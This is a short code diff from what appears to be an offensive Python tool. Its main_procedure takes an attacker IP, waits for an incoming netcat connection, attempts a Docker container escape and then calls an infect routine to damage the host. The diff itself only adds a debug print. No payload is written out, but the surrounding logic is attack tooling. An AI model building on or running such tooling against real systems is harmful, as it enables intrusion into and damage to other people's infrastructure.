@@ -177,6 +177,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
                         escape=mc.docker_escape(atk_sess)
                         if(escape):
+                            print(escape)
                             print(f"{C.COL_YELLOW} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
                             mc.infect()
                         else:
